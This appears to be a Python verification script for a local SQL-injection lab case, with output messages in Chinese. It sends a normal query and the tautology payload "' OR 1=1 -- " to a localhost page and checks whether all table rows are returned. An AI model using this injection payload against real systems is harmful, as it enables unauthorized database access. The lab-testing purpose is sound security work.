#!/usr/bin/env python3
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:4280/lab_cases/S005/index.php"

def fetch(q: str):
    url = BASE_URL + "?" + urllib.parse.urlencode({"q": q})
    with urllib.request.urlopen(url, timeout=10) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body

def main():
    ordinary_q = "Alice"
    test_q = "' OR 1=1 -- "

    ordinary_status, ordinary_body = fetch(ordinary_q)
    test_status, test_body = fetch(test_q)

    print(f"普通请求 q={ordinary_q!r}: HTTP {ordinary_status}")
    print(f"测试请求 q={test_q!r}: HTTP {test_status}")

    ordinary_has_alice = "Alice" in ordinary_body
    ordinary_has_bob = "Bob" in ordinary_body
    ordinary_has_carol = "Carol" in ordinary_body

    test_has_alice = "Alice" in test_body
    test_has_bob = "Bob" in test_body
    test_has_carol = "Carol" in test_body

    print("普通响应包含: Alice=%s Bob=%s Carol=%s" % (
        ordinary_has_alice, ordinary_has_bob, ordinary_has_carol
    ))
    print("测试响应包含: Alice=%s Bob=%s Carol=%s" % (
        test_has_alice, test_has_bob, test_has_carol
    ))

    ordinary_ok = ordinary_has_alice and not ordinary_has_bob and not ordinary_has_carol
    test_ok = test_has_alice and test_has_bob and test_has_carol

    if ordinary_ok and test_ok:
        print("观察结果符合 SQL 注入验证预期：普通输入仅返回 Alice，测试输入返回 Alice/Bob/Carol。")
    else:
        print("未达到预期。请检查入口、db_connect.php、lab_people 表数据、URL 编码及 MySQL 注释语法前提；不要仅凭 HTTP 200 判定成功。")

if __name__ == "__main__":
    main()
